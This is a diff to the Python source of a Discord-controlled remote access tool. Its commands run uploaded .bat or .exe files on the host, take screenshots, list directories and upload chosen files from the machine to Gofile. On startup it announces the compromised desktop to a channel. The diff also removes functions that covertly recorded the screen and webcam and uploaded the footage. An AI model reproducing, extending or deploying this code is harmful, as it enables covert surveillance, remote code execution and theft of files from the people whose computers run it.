@@ -76,15 +76,22 @@ async def upload_to_gofile(file_path):
 
     async with aiofiles.open(file_path, 'rb') as file:
         data = await file.read()
-        files = {'file': data}
+        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'  # Example boundary
         headers = {
             'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
-            'X-Request-Id': GOFILE_ACCOUNT_ID
+            'X-Request-Id': GOFILE_ACCOUNT_ID,
+            'Content-Type': f'multipart/form-data; boundary={boundary}'
         }
+        body = f'--{boundary}\r\n'.encode() + \
+               f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'.encode() + \
+               'Content-Type: application/octet-stream\r\n\r\n'.encode() + \
+               data + \
+               f'\r\n--{boundary}--\r\n'.encode()
+
         timeout = aiohttp.ClientTimeout(total=60)  # Increase timeout to 60 seconds
         async with aiohttp.ClientSession(timeout=timeout) as session:
             try:
-                async with session.post(GOFILE_API_URL, data=files, headers=headers) as response:
+                async with session.post(GOFILE_API_URL, data=body, headers=headers) as response:
                     response_data = await response.text()
                     print(f"API Response: {response_data}")  # Debug statement
                     if response.status == 200:
@@ -127,17 +134,17 @@ async def send(ctx):
         try:
             if file_path.endswith(".bat") or file_path.endswith(".exe"):
                 subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.green())
+                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.dark_red())
                 await ctx.send(embed=embed)
                 print(f"Executed file: {file_path}")  # Debug statement
             else:
-                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.red())
+                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.dark_red())
                 await ctx.send(embed=embed)
         except Exception as e:
-            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.red())
+            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.dark_red())
             await ctx.send(embed=embed)
     else:
-        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.orange())
+        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.dark_red())
         await ctx.send(embed=embed)
 
 # Command to take a screenshot
@@ -154,7 +161,7 @@ async def screenshot(ctx):
     byte_io = io.BytesIO()
     screenshot.save(byte_io, 'PNG')
     byte_io.seek(0)
-    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.blue())
+    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
     embed.set_image(url="attachment://screenshot.png")
     await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))
 
@@ -185,7 +192,7 @@ async def filelist(ctx):
     for i in range(0, len(file_list), chunk_size):
         chunk = file_list[i:i + chunk_size]
         file_list_str = "\n".join(chunk)
-        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.blue())
+        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.dark_red())
         await ctx.send(embed=embed)
 
 # Command to download a specific directory or file
@@ -209,7 +216,7 @@ async def download(ctx, *, path: PathConverter):
             # List all files in the specified directory
             files = os.listdir(path)
             file_list = "\n".join([os.path.join(path, file) for file in files])
-            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.blue())
+            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.dark_red())
             await ctx.send(embed=embed)
         elif os.path.isfile(path):
             file_size = os.path.getsize(path)
@@ -217,158 +224,43 @@ async def download(ctx, *, path: PathConverter):
             file_extension = os.path.splitext(path)[1].lower()
             print(f"File extension: {file_extension}")  # Debug statement
 
-            # Remove .s and spaces from the filename
+            # Ensure the file is saved with its original name and extension
             base_name = os.path.basename(path)
-            new_base_name = base_name.replace('.s', '').replace(' ', '')
-            new_file_path = os.path.join(FILES_DIR, new_base_name)
+            new_file_path = os.path.join(FILES_DIR, base_name)
 
             # Check if the file already exists in the files directory
             if not os.path.exists(new_file_path):
                 # Upload the file to Gofile and get the download link
                 download_link = await upload_to_gofile(path)
                 if download_link:
-                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.blue())
+                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.dark_red())
                     await ctx.send(embed=embed)
                 else:
-                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.red())
+                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.dark_red())
                     await ctx.send(embed=embed)
             else:
                 print(f"File already exists: {new_file_path}")  # Debug statement
-                embed = discord.Embed(title="File Already Exists", description=f"The file {new_base_name} already exists in the files directory.", color=discord.Color.blue())
+                embed = discord.Embed(title="File Already Exists", description=f"The file {base_name} already exists in the files directory.", color=discord.Color.dark_red())
                 await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.red())
+            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.dark_red())
             await ctx.send(embed=embed)
     else:
         print(f"File does not exist: {path}")  # Debug statement
-        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.red())
+        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.dark_red())
         await ctx.send(embed=embed)
 
-# Function to record screen using pyautogui and opencv for a given duration
-async def record_screen(duration, file_path):
-    # Get screen size
-    screen_size = pyautogui.size()
-    width, height = screen_size
-
-    # Define the codec and create VideoWriter object
-    fourcc = cv2.VideoWriter_fourcc(*"XVID")
-    out = cv2.VideoWriter(file_path, fourcc, 20.0, (width, height))
-
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        # Capture the screen
-        screenshot = pyautogui.screenshot()
-        frame = np.array(screenshot)
-        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-
-        # Write the frame into the file
-        out.write(frame)
-
-    # Release everything if job is finished
-    out.release()
-    cv2.destroyAllWindows()
-
-# Function to record webcam using opencv for a given duration
-def record_webcam(duration, output_path, camera_index=0):
-    # Open the webcam
-    cap = cv2.VideoCapture(camera_index)
-
-    if not cap.isOpened():
-        print("Error: Could not open webcam.")
-        return
-
-    # Define the codec and create VideoWriter object
-    fourcc = cv2.VideoWriter_fourcc(*'XVID')
-    frame_width = int(cap.get(3))
-    frame_height = int(cap.get(4))
-    out = cv2.VideoWriter(output_path, fourcc, 20.0, (frame_width, frame_height))
-
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        ret, frame = cap.read()
-        if not ret:
-            print("Failed to grab frame")
-            break
-        out.write(frame)
-
-    # Release everything if job is finished
-    cap.release()
-    out.release()
-    cv2.destroyAllWindows()
-
-# Command to record system screen in intervals and upload to Gofile
+# Command to list all available commands
 @bot.command()
-async def record(ctx, duration: int):
-    # Check if the command is in the correct channel
-    if ctx.channel.id != CHANNEL_ID:
-        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
-        return
+async def cmds(ctx):
+    # Remove the help command from the list and prepend the prefix
+    commands_list = [f"!{command.name}" for command in bot.commands if command.name != "help"]
+    embed = discord.Embed(title="Available Commands", description="Here is a list of all available commands:", color=discord.Color.dark_red())
+    embed.add_field(name="Commands", value="\n".join(commands_list), inline=False)
+    await ctx.send(embed=embed)
 
-    # Validate duration
-    if duration <= 0:
-        await ctx.send("Please provide a positive number of minutes to record.")
-        return
-
-    # Calculate total duration in seconds
-    total_duration = duration * 60
-
-    interval_duration = 30  # 30 seconds per interval
-    start_time = datetime.now()
-
-    while total_duration > 0:
-        # Record the screen for the interval
-        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
-        await record_screen(interval_duration, file_path)
-
-        # Upload the video to Gofile in the background
-        asyncio.create_task(upload_and_send_link(ctx, file_path))
-
-        # Update the total duration
-        total_duration -= interval_duration
-        start_time = datetime.now()
-        await asyncio.sleep(interval_duration)
-
-# Command to record webcam in intervals and upload to Gofile
-@bot.command()
-async def webcam(ctx, duration: int, camera_index: int = 0):
-    # Check if the command is in the correct channel
-    if ctx.channel.id != CHANNEL_ID:
-        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
-        return
-
-    # Validate duration
-    if duration <= 0:
-        await ctx.send("Please provide a positive number of minutes to record.")
-        return
-
-    # Calculate total duration in seconds
-    total_duration = duration * 60
-
-    interval_duration = 30  # 30 seconds per interval
-    start_time = datetime.now()
-
-    while total_duration > 0:
-        # Record the webcam for the interval
-        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
-        record_webcam(interval_duration, file_path, camera_index)
-
-        # Upload the video to Gofile in the background
-        asyncio.create_task(upload_and_send_link(ctx, file_path))
-
-        # Update the total duration
-        total_duration -= interval_duration
-        start_time = datetime.now()
-        await asyncio.sleep(interval_duration)
-
-# Function to upload a file to Gofile and send the link to the channel
-async def upload_and_send_link(ctx, file_path):
-    gofile_link = await upload_to_gofile(file_path)
-    if gofile_link:
-        await ctx.send(f'30-second interval recorded and uploaded to Gofile: {gofile_link}')
-        # Delete the temporary file after uploading
-        os.remove(file_path)
-    else:
-        print(f"Failed to upload file: {file_path}")  # Debug statement
+# Override the default help command
+bot.help_command = None
 
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
@@ -394,7 +286,7 @@ async def on_ready():
 
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
-    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.green())
+    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.dark_red())
     await channel.send(embed=embed)
 
     print(f"Bot is online. Pinged channel: {channel.name}")
